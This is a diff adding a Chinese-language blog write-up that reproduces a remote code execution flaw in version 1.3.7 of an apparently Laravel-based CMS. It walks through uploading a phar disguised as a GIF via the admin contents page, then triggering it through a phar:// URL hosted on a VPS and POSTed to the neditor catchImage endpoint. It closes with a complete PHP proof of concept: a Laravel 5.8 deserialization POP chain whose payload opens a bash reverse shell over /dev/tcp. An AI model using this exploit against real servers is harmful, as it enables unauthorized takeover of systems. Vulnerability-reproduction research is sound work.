@@ -168,11 +168,152 @@
                 
                 <h2 class="section-heading">v1.3.7RCE漏洞</h2>
                 
-                <p>&nbsp;&nbsp;&nbsp;其实我想要复现的是它获取phar的过程，
-                	但需要搭配laravel框架pop链，后面再来分析，待续</p>
+                <p>&nbsp;&nbsp;&nbsp;首先用laravel5.8的反序列化链生成一个phar文件，这里要修改为图片后缀并加上十六进制文件头。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;接着，访问接口/admin/entity/2/contents，点击新增文件内容。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来到/admin/entity/2/contents/create后，在上传图片的功能点处上传刚刚生成gif后缀的phar文件，
+                	上传成功后会显示phar文件的相对路径。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-3.jpg" alt="">
+                </a>
+                
+								<p>&nbsp;&nbsp;&nbsp;到自己的vps上，写一个触发phar的url。这里有一个点卡了我很久，
+									如果你是把这段phar协议的url放txt文本上，file_get_contents()函数读取到的内容是会带一个\n换行符，导致不能进入is_url()分支。
+									所以这里才要用php文件去输出内容。
+									不过我在我的vps上装了框架，所以路由里面才直接return一个phar://./upload/image/202107/4vAAcw82fuQWYMMUsDgp0tg5A1KYU2LLsIf5J00R.gif，其实这里直接写一个php文件输出就行。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;跟原先v1.3.5的漏洞一样POST一个file参数到接口/admin/neditor/serve/catchImage，
+                	这里的file参数填刚刚在vps上面写的文件。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;因为这里的命令执行没有回显，所以选择反弹个shell到vps上。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;接着，来分析一下源码。</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-7.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;</p>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-6-5/pop-2-8.jpg" alt="">
+                </a>
                 
                 
                 
+                
+                
+                <h2 class="section-heading">poc</h2>
+                
+								<div>
+									
+								<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span> {
+
+    <span class="hljs-title">class</span> <span class="hljs-title">PendingBroadcast</span>
+    {
+
+        <span class="hljs-title">protected</span> $<span class="hljs-title">events</span>;
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$event</span>;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>)</span>
+        </span>{
+            <span class="hljs-variable">$this</span>-&gt;events = <span class="hljs-variable">$obj_destruct</span>;
+            <span class="hljs-variable">$this</span>-&gt;event = <span class="hljs-variable">$obj_implements</span>;
+        }
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
+        </span>{
+            <span class="hljs-variable">$this</span>-&gt;events-&gt;dispatch(<span class="hljs-variable">$this</span>-&gt;event);
+        }
+    }
+
+}
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span> {
+
+    <span class="hljs-title">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">Queue</span>;
+    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">ShouldQueue</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dispatcher</span>
+    </span>{
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$queueResolver</span> = <span class="hljs-string">'system'</span>;
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;queueResolver &amp;&amp; <span class="hljs-variable">$this</span>-&gt;commandShouldBeQueued(<span class="hljs-variable">$command</span>)) {
+                <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;dispatchToQueue(<span class="hljs-variable">$command</span>);
+            }
+        }
+
+        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commandShouldBeQueued</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-variable">$command</span> <span class="hljs-keyword">instanceof</span> ShouldQueue;
+        }
+
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatchToQueue</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-variable">$connection</span> = <span class="hljs-variable">$command</span>-&gt;connection ?? <span class="hljs-keyword">null</span>;
+
+            <span class="hljs-variable">$queue</span> = call_user_func(<span class="hljs-variable">$this</span>-&gt;queueResolver, <span class="hljs-variable">$connection</span>);
+        }
+    }
+}
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span> {
+
+    <span class="hljs-title">class</span> <span class="hljs-title">BroadcastEvent</span>
+    {
+        <span class="hljs-title">public</span> $<span class="hljs-title">connection</span> = '<span class="hljs-title">bash</span> -<span class="hljs-title">i</span> &gt;&amp; /<span class="hljs-title">dev</span>/<span class="hljs-title">tcp</span>/<span class="hljs-title">ip</span>/<span class="hljs-title">port</span> 0&gt;&amp;1';
+    }
+}
+
+<span class="hljs-keyword">namespace</span> {
+
+    $<span class="hljs-title">obj_destruct</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>\<span class="hljs-title">Dispatcher</span>();
+    <span class="hljs-variable">$obj_implements</span> = <span class="hljs-keyword">new</span> Illuminate\Broadcasting\BroadcastEvent(<span class="hljs-string">'17'</span>);
+    <span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>);
+    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+
+    <span class="hljs-comment">// 生成phar文件，$pwn变量为payload中实例化后的的对象</span>
+    @unlink(<span class="hljs-string">'exp.gif'</span>);
+    <span class="hljs-comment">// .phar文件</span>
+    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"exp.phar"</span>);
+    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();
+    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">"GIF89a"</span> . <span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;</span></span>");
+    $phar-&gt;setMetadata($pwn);
+    // 生成签名
+    $phar-&gt;addFromString("exp.txt", "test");
+    $phar-&gt;stopBuffering();
+    rename('exp.phar', 'exp.gif');
+
+}</code></pre>	
+									
+								</div>
+								
                 
 
 
